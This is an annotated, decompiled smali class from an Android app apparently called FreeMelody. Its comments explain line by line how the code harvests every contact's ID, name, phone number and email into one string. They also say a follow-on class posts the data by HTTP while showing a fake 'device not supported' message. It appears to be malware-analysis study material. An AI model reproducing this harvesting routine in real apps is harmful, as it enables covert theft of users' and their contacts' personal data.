.class Lcom/mmmm/bl/FreeMelody$1;
.super Ljava/lang/Object;
.source "FreeMelody.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/mmmm/bl/FreeMelody;->onStart()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/mmmm/bl/FreeMelody;


# direct methods
.method constructor <init>(Lcom/mmmm/bl/FreeMelody;)V
#initialization method
    .locals 0

    .prologue
    .line 1
#store object reference to this$0:Lcom/mmmm/bl/FreeMelody into p1 referenced by p0
    iput-object p1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;
    .line 55
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method static synthetic access$0(Lcom/mmmm/bl/FreeMelody$1;)Lcom/mmmm/bl/FreeMelody;
#Method created by compiler, used when another class needs access to this$0:Lcom/mmmm/bl/FreeMelody;
    .locals 1
    .prologue
    .line 55
    iget-object v0, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 14
#14 non-parameterized registers

    .prologue
    .line 57
#gets this$0:Lcom/mmmm/bl/FreeMelody stores in register v1
    iget-object v1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;
    
    invoke-virtual {v1}, Lcom/mmmm/bl/FreeMelody;->getContentResolver()Landroid/content/ContentResolver;
#ContentResolver allows this application to have access to data from other applications in a secure manner.

    move-result-object v0
#moves this instance of content resolver to be referenced by v0
    .line 58
    .local v0, "resolver":Landroid/content/ContentResolver;
    
#gets contacts object reference, puts it in v1 
    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;
    
#creates 4 registers with null values
    const/4 v2, 0x0
    const/4 v3, 0x0
    const/4 v4, 0x0
    const/4 v5, 0x0

#calls ContentResolver's query method with v1-v5. v1 is the reference to contacts. Stores returned value in v0. Saves as Cursor object(like a database) which allows random read-write permissions
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

#moves contact details to v11
    move-result-object v11

    .line 60
#Names this instance of cursor, referenced in v11
    .local v11, "cursor":Landroid/database/Cursor;

#Creates instance of string builder in v12
#initialize's it
    new-instance v12, Ljava/lang/StringBuilder;
    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    .line 62
#stores it as local object variable
    .local v12, "getString":Ljava/lang/StringBuilder;
    
#Calls Cursors moveToFirst method, points at first row now. Puts in v13
    invoke-interface {v11}, Landroid/database/Cursor;->moveToFirst()Z
    move-result v13

#If value in v13 is not 0 jump to cond_0 tag, 0 would represent nothing.
    .line 63
    .local v13, "isEof":Z
    :goto_0
    if-nez v13, :cond_0

    .line 91
    iget-object v1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;
    
#Calls stringBuilder in v12. Moves result to v2. v2 now holds all contacts data collected.
    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2
    
#allows access to contacts variable in parent class. puts v2 (contact details) into this variable in the parent class. 
    invoke-static {v1, v2}, Lcom/mmmm/bl/FreeMelody;->access$0(Lcom/mmmm/bl/FreeMelody;Ljava/lang/String;)V

    .line 94
    iget-object v1, p0, Lcom/mmmm/bl/FreeMelody$1;->this$0:Lcom/mmmm/bl/FreeMelody;

# getter for: Lcom/mmmm/bl/FreeMelody;->mHandler:Landroid/os/Handler;
    #calls class from main outer class access$1, allows access to osHandler
    invoke-static {v1}, Lcom/mmmm/bl/FreeMelody;->access$1(Lcom/mmmm/bl/FreeMelody;)Landroid/os/Handler;
    move-result-object v1

#Creates new instance of FreeMelody$1$1, calls init method
    new-instance v2, Lcom/mmmm/bl/FreeMelody$1$1;
    invoke-direct {v2, p0}, Lcom/mmmm/bl/FreeMelody$1$1;-><init>(Lcom/mmmm/bl/FreeMelody$1;)V

#adds FreeMelody$1$1 to osHandler queue
    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

#Essentialy this is the ending script when all the data is collected. Jumps here if there are no contacts or when contact has been collec
#FreeMelody$1$1 is the script that calls postHttp and also displays a message in japanese on screen.
#申し訳ございません。お使いの端末は未対応のためご利用いただけません
#Which translates to: 'I'm sorry. Your device is not supported and can not be used'
    .line 110
    return-void

#jumps here if v13 was not 0
    .line 64
    :cond_0
#new instance of StringBuilder in v1
    new-instance v1, Ljava/lang/StringBuilder;
    
#Creates string referenced by v2
    const-string v2, "_id"

#calls Cursor (contacts database), gets the column called '_id' number. Puts the int in v2.
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
    move-result v2

#Calls Cursor getString, passing in the column ID in v2, returns value of column as string.
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v2

#Gets the string representation of the char array, puts in v2.
    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v2

#Calls StringBuilder init. v2 as arg.
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

#appends the ':' in v2 onto the string of contact ID's in v1
    const-string v2, ":"
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1

#returns a sting representing the string in v1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1

#Calls stringbuilder instance in v12. Appends new string in v1 to the one in v12
    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    
#All contact ID's are now in object referenced by v12 as a string.


    .line 65
#New instance StringBuilder
    new-instance v1, Ljava/lang/StringBuilder;

#New string in v2
    const-string v2, "display_name"
    
#Calls Cursor getColumnIndex, returns coluumn number as int. Moves int to v2
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
    move-result v2
    
#Calls Cursor.getString with column number. Returns column as a string, put in v2.
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v2

#Calls string.valueOf, Returns string with value of the object reference in v2
    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v2

#Builds string in v1
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

#Appends ':' to the end of string in v1
    const-string v2, ":"
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1

#Calls StringBuilder.toString, returns string representing the one in v1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1

#Appends Display_names to v12.
    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

#v12 register is now a string containing ID's and Displaynames of contacts split by ':'

    .line 67
#Creates string in v1
    const-string v1, "_id"

#Gets column index of _id again
    invoke-interface {v11, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
    move-result v1

#Gets data in ID_ column as string puts in v8
    invoke-interface {v11, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v8

    .line 69
#saves the ID's as 'contactsID' variable
    .local v8, "contactsId":Ljava/lang/String;

#creates empty string in v10 calls it contactsPhone
    const-string v10, ""
    .line 70
    .local v10, "contactsPhone":Ljava/lang/String;

#string in v1
    const-string v1, "has_phone_number"

#Gets column number of column names has_phone_number, puts int in v1
    invoke-interface {v11, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
    move-result v1

#Gets data in has phone number as string, puts in v1
    invoke-interface {v11, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v1

#parses the string of people with phone numbers as int
    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    move-result v1

#if v1 <= 0 jump to cond_1
    if-lez v1, :cond_1

#if v1 > 0 (if there are people with phone numbers)
#Gets access to object containing raw contact data
    .line 71
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0
    const-string v3, "contact_id = ? "
    const/4 v4, 0x1
    
#creates an array of strings
    new-array v4, v4, [Ljava/lang/String;
    const/4 v5, 0x0

#puts the integer in v8 into an array, v8 holds the ID's of people with phone numbers
#v4 references an array of IDs of people with phone numbers. indexed by v5 
    aput-object v8, v4, v5
    const/4 v5, 0x0

#calls contentResolver.query, with given args. Returns phone numbers of those with ID's in v4. Stores in v7. Loops.
#the if statement jumps to cond_2 tag if v1 is not 0. (if there are more rows). This creates a loop untill there are no more rows left.
#in the loop, the phone number is placed in v10 (contactsPhone variable)
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v7
    .line 72
    .local v7, "cPhone":Landroid/database/Cursor;
    :goto_1
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z
    move-result v1
    if-nez v1, :cond_2

#closes cursor instance in v7. Ends local v7.
    .line 75
    invoke-interface {v7}, Landroid/database/Cursor;->close()V
    .line 77
    .end local v7    # "cPhone":Landroid/database/Cursor;

#Jumps here if there was nobody with phone numbers
    :cond_1

#new instance of string builder
    new-instance v1, Ljava/lang/StringBuilder;

#Calls string.valueOf on v10. Puts the value in v2
    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v2

#Calls StringBuilder instance in v1, passing v2 as arg. Then appends a colon.
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    const-string v2, ":"
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1


    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1

#Appends the contactsPhone string in v1 to v12.
    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

#v12 now has phone numbers appended onto the display names and ID's

#Creates string in v9, names it contactsMail.
    .line 79
    const-string v9, ""
    .line 81
    .local v9, "contactsMail":Ljava/lang/String;

#gets access to Email data
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Email;->CONTENT_URI:Landroid/net/Uri;

#This is the same as before. Gathers all Emails in a loop, adds them to variable in v9 register. 
    const/4 v2, 0x0
    const-string v3, "contact_id = ? "
    const/4 v4, 0x1
    new-array v4, v4, [Ljava/lang/String;
    const/4 v5, 0x0
    aput-object v8, v4, v5
    const/4 v5, 0x0

    .line 80
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v6
    .line 82
    .local v6, "cMail":Landroid/database/Cursor;
    :goto_2
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z
    move-result v1
    if-nez v1, :cond_3

#once done closes instance of cursor.
    .line 85
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

#New instance string builder
    .line 86
    new-instance v1, Ljava/lang/StringBuilder;

#gets value of v9 (contains email addresses of contacts)
    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v2

#Builds string, appends /, guessing represents end of data.
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    const-string v2, "/"
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1

#Turns it back into string
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1

#Appends it to v12. v12 now contains ID's, display names, phone numbers and Email addresses
    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    .line 88
    invoke-interface {v11}, Landroid/database/Cursor;->moveToNext()Z

    move-result v13
    
#Starts ending script, FreeMelody$1$1
    goto/16 :goto_0

    .line 73
    .end local v6    # "cMail":Landroid/database/Cursor;
    .end local v9    # "contactsMail":Ljava/lang/String;
    .restart local v7    # "cPhone":Landroid/database/Cursor;
    
#this is the loop for collecting phone numbers. Each number is placed in v10.
    :cond_2
    const-string v1, "data1"
    invoke-interface {v7, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
    move-result v1
    invoke-interface {v7, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v10
    goto :goto_1

    .line 83
    .end local v7    # "cPhone":Landroid/database/Cursor;
    .restart local v6    # "cMail":Landroid/database/Cursor;
    .restart local v9    # "contactsMail":Ljava/lang/String;
   
   :cond_3
    const-string v1, "data1"
    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
    move-result v1
    invoke-interface {v6, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v9
    goto :goto_2
    
.end method
